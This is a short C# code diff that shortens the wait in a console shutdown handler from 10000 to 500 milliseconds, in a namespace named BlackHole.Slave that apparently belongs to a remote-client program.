@@ -21,7 +21,7 @@ namespace BlackHole.Slave
             Kernel32.SetConsoleCtrlHandler((ctrl) =>
             {
                 NetworkService.Instance.FireShutdown((int)ctrl);
-                Thread.Sleep(10000);
+                Thread.Sleep(500);
                 return true;
             }, true);
             Application.Run();
